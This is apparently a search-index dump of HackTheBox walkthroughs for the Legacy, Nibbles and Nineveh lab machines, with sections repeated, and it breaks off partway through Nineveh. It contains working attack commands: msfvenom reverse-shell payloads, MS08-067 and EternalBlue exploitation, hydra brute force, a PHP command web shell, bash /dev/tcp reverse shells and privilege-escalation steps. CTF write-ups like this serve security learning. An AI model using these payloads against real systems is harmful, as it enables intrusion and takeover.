netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds 3389/tcp closed ms-wbt-server Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: -4h16m00s, deviation: 2h07m16s, median: -5h46m00s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:c4:3d (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2021-04-01T03:52:25+03:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.23 seconds Server Message Block Enum with smbmap and smbclient , but cannot see value info. ### SMB Enumeration (445) ############################ smbmap -H 10.10.10.4 [+] IP: 10.10.10.4:445 Name: 10.10.10.4 smbclient -L 10.10.10.4 protocol negotiation failed: NT_STATUS_IO_TIMEOUT Using nmap to scan smb vulnerability: \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.6:18.5]~/scripting \u2514\u2500$ nmap -p 139,445 --script smb-vul* 10.10.10.4 -Pn Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 23:43 EDT Nmap scan report for 10.10.10.4 Host is up (0.25s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: LIKELY VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 |_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 Nmap done: 1 IP address (1 host up) scanned in 36.31 seconds Foothold smb-vuln-ms08-067 Poc code here Microsoft Windows Server 2000/2003 - Code Execution (MS08-067) In the poc, I neet to REPLACE THIS SHELLCODE with shellcode generated for your use . The bad chars \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" msfvenom -p windows/shell_reverse_tcp LHOST = 10 .10.14.4 LPORT = 443 EXITFUNC = thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f c -a x86 --platform windows Create a listener in Kali machine. sudo nc -nvlp 443 Convert poc to python3 2to3 ms08-067.py Get reverse shell python3 ms08-067.py 10 .10.10.4 6 445 > /dev/null Create smb server in Kali Machine to check privilege. sudo smbserver.py public /usr/share/windows-resources/binaries/ > /dev/null \\\\10.10.14.5\\public\\whoami.exe smb-vuln-ms17-010 Poc code here Microsoft Security Bulletin MS17-010 (EternalBlue/MS17-010) Generate reverse shell file shell.exe in the same payload's folder using msfvenom . msfvenom -p windows/shell_reverse_tcp LHOST = 10 .10.14.4 LPORT = 443 EXITFUNC = thread -f exe -a x86 --platform windows -o shell.exe Create a listener in Kali machine. sudo nc -nvlp 443 Get reverse shell python send_and_execute.py 10 .10.10.4 shell.exe > /dev/null Run cmd in poc file Poc code here Get reverse shell sudo smbserver.py public /home/kali/walkthrough/hackthebox/legacy > /dev/null python cmd.py 10.10.10.4 '\\\\10.10.14.5\\public\\shell.exe' > /dev/null Reference worawit/MS17-010 HTB: Legacy of 0xdf hacks stuff Install PyCrypto library","title":"HTB Legacy"},{"location":"walkthrough/hackthebox/Legacy/index.html#hackthebox-legacy","text":"Author: Hades Scripting here","title":"HackTheBox Legacy"},{"location":"walkthrough/hackthebox/Legacy/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Legacy/index.html#openning-services","text":"\u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:14.1]~/scripting \u2514\u2500$ sudo ./enum/all.sh 10.10.10.4 [sudo] password for kali: ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.4 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 139,445,3389 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.4 -p139,445,3389 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 23:38 EDT Nmap scan report for 10.10.10.4 Host is up (0.25s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds 3389/tcp closed ms-wbt-server Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: -4h16m00s, deviation: 2h07m16s, median: -5h46m00s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:c4:3d (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2021-04-01T03:52:25+03:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.23 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Legacy/index.html#server-message-block","text":"Enum with smbmap and smbclient , but cannot see value info. ### SMB Enumeration (445) ############################ smbmap -H 10.10.10.4 [+] IP: 10.10.10.4:445 Name: 10.10.10.4 smbclient -L 10.10.10.4 protocol negotiation failed: NT_STATUS_IO_TIMEOUT Using nmap to scan smb vulnerability: \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.6:18.5]~/scripting \u2514\u2500$ nmap -p 139,445 --script smb-vul* 10.10.10.4 -Pn Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 23:43 EDT Nmap scan report for 10.10.10.4 Host is up (0.25s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: LIKELY VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 |_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 Nmap done: 1 IP address (1 host up) scanned in 36.31 seconds","title":"Server Message Block"},{"location":"walkthrough/hackthebox/Legacy/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Legacy/index.html#smb-vuln-ms08-067","text":"Poc code here Microsoft Windows Server 2000/2003 - Code Execution (MS08-067) In the poc, I neet to REPLACE THIS SHELLCODE with shellcode generated for your use . The bad chars \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" msfvenom -p windows/shell_reverse_tcp LHOST = 10 .10.14.4 LPORT = 443 EXITFUNC = thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f c -a x86 --platform windows Create a listener in Kali machine. sudo nc -nvlp 443 Convert poc to python3 2to3 ms08-067.py Get reverse shell python3 ms08-067.py 10 .10.10.4 6 445 > /dev/null Create smb server in Kali Machine to check privilege. sudo smbserver.py public /usr/share/windows-resources/binaries/ > /dev/null \\\\10.10.14.5\\public\\whoami.exe","title":"smb-vuln-ms08-067"},{"location":"walkthrough/hackthebox/Legacy/index.html#smb-vuln-ms17-010","text":"Poc code here Microsoft Security Bulletin MS17-010 (EternalBlue/MS17-010) Generate reverse shell file shell.exe in the same payload's folder using msfvenom . msfvenom -p windows/shell_reverse_tcp LHOST = 10 .10.14.4 LPORT = 443 EXITFUNC = thread -f exe -a x86 --platform windows -o shell.exe Create a listener in Kali machine. sudo nc -nvlp 443 Get reverse shell python send_and_execute.py 10 .10.10.4 shell.exe > /dev/null Run cmd in poc file Poc code here Get reverse shell sudo smbserver.py public /home/kali/walkthrough/hackthebox/legacy > /dev/null python cmd.py 10.10.10.4 '\\\\10.10.14.5\\public\\shell.exe' > /dev/null","title":"smb-vuln-ms17-010"},{"location":"walkthrough/hackthebox/Legacy/index.html#reference","text":"worawit/MS17-010 HTB: Legacy of 0xdf hacks stuff Install PyCrypto library","title":"Reference"},{"location":"walkthrough/hackthebox/Nibbles/index.html","text":"HackTheBox Nibbles Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.75 [+] Openning ports: 22,80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.75 -p22,80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-06 12:13 +07 Nmap scan report for 10.10.10.75 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.65 seconds Apache httpd 2.4.18 Checking source code, there is a directory /nibbleblog/ . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:30.3]~ \u2514\u2500$ curl http://10.10.10.75/ <b>Hello world!</b> <snip> <!-- /nibbleblog/ directory. Nothing interesting here! --> List of hidden in the server after /nibbleblog/ using gobuster \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:51.3]~ \u2514\u2500$ gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -q /install.php (Status: 200) [Size: 78] /index.php (Status: 200) [Size: 2986] /update.php (Status: 200) [Size: 1622] /admin.php (Status: 200) [Size: 1401] /.htaccess (Status: 403) [Size: 306] /feed.php (Status: 200) [Size: 300] /sitemap.php (Status: 200) [Size: 401] Nibbleblog 4.0.3 I go to http://10.10.10.75/nibbleblog/install.php , and it shows the update link. Go to update.php , I know the server was running Nibbleblog 4.0.3 Find public exploit using searchsploit . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:43.2]~ \u2514\u2500$ searchsploit Nibbleblog 4.0.3 ---------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------- --------------------------------- Nibbleblog 4.0.3 - Arbitrary File Upload (Met | php/remote/38489.rb ---------------------------------------------- --------------------------------- Shellcodes: No Results Foothold Guessable Admin Credential At the url http://10.10.10.75/nibbleblog/admin.php , It is login page for admin. I try to brute force with hydra but my ip address have been blocked. hydra -l admin -P /home/kali/directory/rockyou.txt 10.10.10.75 http-post-form '/nibbleblog/admin.php:username=admin&password=^PASS^:Incorrect username or password.' Let's try a manual guess with some common credentials and I got the username admin , password nibbles to login successfully. Nibbleblog 4.0.3 Upload Follow exploit php/remote/38489.rb and searching in the internet, I found manual steps here . At Plugins My image , upload file php-reverse-shell.php . Execute file upload and get reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:42.7]~/payloads/web-shells/php \u2514\u2500$ curl 10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php At the listener, I have reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:42.7]~/walkthrough/hackthebox/nibbles \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.75] 47294 Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 02:47:49 up 1:35, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler) /bin/sh: 0: can't access tty; job control turned off $ id uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler) Privilege Escalation Sudo access file overwrite At home nibbler's folder, I saw a personal.zip file, try to unzip it and read more. nibbler@Nibbles:/home/nibbler$ ls -la <snip> -r-------- 1 nibbler nibbler 1855 Dec 10 2017 personal.zip -r-------- 1 nibbler nibbler 33 Apr 6 01:12 user.txt nibbler@Nibbles:/home/nibbler$ unzip personal.zip Archive: personal.zip creating: personal/ creating: personal/stuff/ inflating: personal/stuff/monitor.sh And also, I enum sudo permission execute file /home/nibbler/personal/stuff/monitor.sh as root without require password. nibbler@Nibbles:/home/nibbler$ sudo -l Matching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh Change file monitor.sh to spawn bash as root and run it with sudo command. shbbler@Nibbles:/home/nibbler$ echo bash > /home/nibbler/personal/stuff/monitor.sh nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh root@Nibbles:/home/nibbler# id uid=0(root) gid=0(root) groups=0(root)","title":"HTB Nibbles"},{"location":"walkthrough/hackthebox/Nibbles/index.html#hackthebox-nibbles","text":"Author: Hades Scripting here","title":"HackTheBox Nibbles"},{"location":"walkthrough/hackthebox/Nibbles/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Nibbles/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.75 [+] Openning ports: 22,80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.75 -p22,80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-06 12:13 +07 Nmap scan report for 10.10.10.75 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.65 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Nibbles/index.html#apache-httpd-2418","text":"Checking source code, there is a directory /nibbleblog/ . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:30.3]~ \u2514\u2500$ curl http://10.10.10.75/ <b>Hello world!</b> <snip> <!-- /nibbleblog/ directory. Nothing interesting here! --> List of hidden in the server after /nibbleblog/ using gobuster \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:51.3]~ \u2514\u2500$ gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -q /install.php (Status: 200) [Size: 78] /index.php (Status: 200) [Size: 2986] /update.php (Status: 200) [Size: 1622] /admin.php (Status: 200) [Size: 1401] /.htaccess (Status: 403) [Size: 306] /feed.php (Status: 200) [Size: 300] /sitemap.php (Status: 200) [Size: 401]","title":"Apache httpd 2.4.18"},{"location":"walkthrough/hackthebox/Nibbles/index.html#nibbleblog-403","text":"I go to http://10.10.10.75/nibbleblog/install.php , and it shows the update link. Go to update.php , I know the server was running Nibbleblog 4.0.3 Find public exploit using searchsploit . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:43.2]~ \u2514\u2500$ searchsploit Nibbleblog 4.0.3 ---------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------- --------------------------------- Nibbleblog 4.0.3 - Arbitrary File Upload (Met | php/remote/38489.rb ---------------------------------------------- --------------------------------- Shellcodes: No Results","title":"Nibbleblog 4.0.3"},{"location":"walkthrough/hackthebox/Nibbles/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Nibbles/index.html#guessable-admin-credential","text":"At the url http://10.10.10.75/nibbleblog/admin.php , It is login page for admin. I try to brute force with hydra but my ip address have been blocked. hydra -l admin -P /home/kali/directory/rockyou.txt 10.10.10.75 http-post-form '/nibbleblog/admin.php:username=admin&password=^PASS^:Incorrect username or password.' Let's try a manual guess with some common credentials and I got the username admin , password nibbles to login successfully.","title":"Guessable Admin Credential"},{"location":"walkthrough/hackthebox/Nibbles/index.html#nibbleblog-403-upload","text":"Follow exploit php/remote/38489.rb and searching in the internet, I found manual steps here . At Plugins My image , upload file php-reverse-shell.php . Execute file upload and get reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:42.7]~/payloads/web-shells/php \u2514\u2500$ curl 10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php At the listener, I have reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:42.7]~/walkthrough/hackthebox/nibbles \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.75] 47294 Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 02:47:49 up 1:35, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler) /bin/sh: 0: can't access tty; job control turned off $ id uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)","title":"Nibbleblog 4.0.3 Upload"},{"location":"walkthrough/hackthebox/Nibbles/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Nibbles/index.html#sudo-access-file-overwrite","text":"At home nibbler's folder, I saw a personal.zip file, try to unzip it and read more. nibbler@Nibbles:/home/nibbler$ ls -la <snip> -r-------- 1 nibbler nibbler 1855 Dec 10 2017 personal.zip -r-------- 1 nibbler nibbler 33 Apr 6 01:12 user.txt nibbler@Nibbles:/home/nibbler$ unzip personal.zip Archive: personal.zip creating: personal/ creating: personal/stuff/ inflating: personal/stuff/monitor.sh And also, I enum sudo permission execute file /home/nibbler/personal/stuff/monitor.sh as root without require password. nibbler@Nibbles:/home/nibbler$ sudo -l Matching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh Change file monitor.sh to spawn bash as root and run it with sudo command. shbbler@Nibbles:/home/nibbler$ echo bash > /home/nibbler/personal/stuff/monitor.sh nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh root@Nibbles:/home/nibbler# id uid=0(root) gid=0(root) groups=0(root)","title":"Sudo access file overwrite"},{"location":"walkthrough/hackthebox/Nineveh/index.html","text":"HackTheBox Nineveh Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.43 [+] Openning ports: 80,443 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.43 -p80,443 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 12:44 +07 Nmap scan report for 10.10.10.43 Host is up (0.28s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR | Not valid before: 2017-07-01T15:03:30 |_Not valid after: 2018-07-01T15:03:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.22 seconds Web Application 80 It is a default web page. List of the hidden in the server using gobuster . ### Web Enumeration (80) ############################ +] Files and directories gobuster dir -k -u http://10.10.10.43:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> =============================================================== /department (Status: 301) [Size: 315] [--> http://10.10.10.43/department/] Login page at /department . I enum more hidden file in uri /department but there are no interested file. Try to brute force username password with hydra using rockyou.txt directory. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:26.2]~/scripting \u2514\u2500$ hydra -l admin -P /home/kali/directory/rockyou.txt 10.10.10.43 http-post-form '/department/login.php:username=admin&password=^PASS^:Invalid Password!' <snip> [80][http-post-form] host: 10.10.10.43 login: admin password: 1q2w3e4r5t After login to department with admin:1q2w3e4r5t , I have a note at the url http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt Web Application 443 Fist in the web, I saw an image here. Based on nmap result, port 443 have domain commonName=nineveh.htb . I add it to /etc/host and go to this site again, but it return the same page. Using gobuster to list hidden in the website, I have uri /db . [+] Files and directories gobuster dir -k -u https://10.10.10.43:443 -w /usr/share/seclists/Discovery/Web-Content/common.txt <snip> =============================================================== /.hta (Status: 403) [Size: 291] /.htaccess (Status: 403) [Size: 296] /.htpasswd (Status: 403) [Size: 296] /db (Status: 301) [Size: 309] [--> https://10.10.10.43/db/] phpLiteAdmin 1.9 at /db . Try to brute force phpLiteAdmin password with hydra using rockyou.txt directory. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:32.3]~ \u2514\u2500$ hydra -l admin -P /home/kali/directory/rockyou.txt 10.10.10.43 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.' <snip> [443][http-post-form] host: 10.10.10.43 login: admin password: password123 Search the public exploit with searchsploit . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:25.1]~/scripting \u2514\u2500$ searchsploit phpLiteAdmin 1.9 -------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------- --------------------------------- PHPLiteAdmin 1.9.3 - Remote PHP Code Inject | php/webapps/24044.txt phpLiteAdmin 1.9.6 - Multiple Vulnerabiliti | php/webapps/39714.txt -------------------------------------------- --------------------------------- Shellcodes: No Results Foothold LFI within filtering Poc code here At url http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt , I saw this url query ninevehNotes.txt file, try to check it with Local file inclusion. With only enough /../ in the url and content file name ninevehNotes , the LFI vulnerability will work. Try read some other sensitive file, I got the result File name too long. . We need have a backdoor with the length long enough. The file name must contain name ninevehNotes . PHP Code Injection Using exploit at php/webapps/24044.txt , I create 1 database named ninevehNotes.php . Create new table name <?php system($_REQUEST['cmd'])?> . The database at /var/tmp/ninevehNotes.php contain php execute code have been created. Now I have a backdoor ninevehNotes.php . PHP Backdoor Back to LFI vulnerability, I execute the backdoor with command id to confirm it. http://nineveh.htb/department/manage.php?notes=../../../../../var/tmp/ninevehNotes.php&cmd=id Step to gain reverse shell. Url encode using hURL \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.0:28.4]~ \u2514\u2500$ hURL -U \"bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'\" Original :: bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1' URL ENcoded :: bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27 Execute bash reverse shell at backdoor ninevehNotes.php \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.0:28.4]~ \u2514\u2500$ cmd='bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27' \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.0:28.3]~ \u2514\u2500$ curl --silent --cookie \"PHPSESSID=qe89kahpkithaplfechcptbjt5\" \"http://nineveh.htb/department/manage.php?notes=../../../../../var/tmp/ninevehNotes.php&cmd=$cmd\" > /dev/null Reverse shell at listener. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.0:28.4]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 37498 bash: cannot set terminal process group (1390): Inappropriate ioctl for device bash: no job control in this shell www-data@nineveh:/var/www/html/department$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@nineveh:/var/www/html/department$ Privilege Escalation Chkrootkit File overwrite Poc code here I use script procmon.sh to check the scheduled tasks in the system. www-data@nineveh:/tmp$ bash procmon.sh < sleep 1 > sleep 1 > /usr/sbin/CRON -f > /bin/sh -c /root/vulnScan.sh > /bin/bash /root/vulnScan.sh > /bin/sh /usr/bin/chkrootkit > find /lib /usr/lib /usr/local/lib -name libproc.a There are command chkrootkit may have the vulnerable, find public exploit using searchsploit . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.5:27.0]~ \u2514\u2500$ searchsploit chkrootkit ------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------ --------------------------------- Chkrootkit - Local Privilege Escalation (Metasploit) | linux/local/38775.rb Chkrootkit 0.49 - Local Privilege Escalation | linux/local/33899.txt ------------------------------------------------------ --------------------------------- Shellcodes: No Results Follow exploit linux/local/33899.txt , I create reverse bash shell in file /tmp/update and add execute permission. echo \"bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'\" > /tmp/update; chmod +x /tmp/update At the listener, I have root shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.6:25.5]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 56490 bash: cannot set terminal process group (27001): Inappropriate ioctl for device bash: no job control in this shell root@nineveh:~# whoami whoami root Steganography and Knockd Poc code here Follow note check your serect folder to get in! figure it out! this is your challenge and check out www folder, I saw ssl folder. www-data@nineveh:/var/www$ ls cd html ssl Go to ssl and there is an secure_notes contain image nineveh.png . www-data@nineveh:/var/www/ssl$ ls secure_notes/ index.html nineveh.png www-data@nineveh:/var/www/ssl$ ls /home amrois May admin used some steganography to hidden text and challenge user amrois to figure it out. I download image nineveh.png and using strings to list text on it. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.2:31.2]~/walkthrough/hackthebox/nineveh \u2514\u2500$ strings nineveh.png www-data secret/nineveh.priv -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI <snip> Now, I have the private key, but at the openning services scanned when I gather infomation, port 22 is not open. Let's have a local enum opening ports. www-data@nineveh:/tmp$ netstat -antup <snip> Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 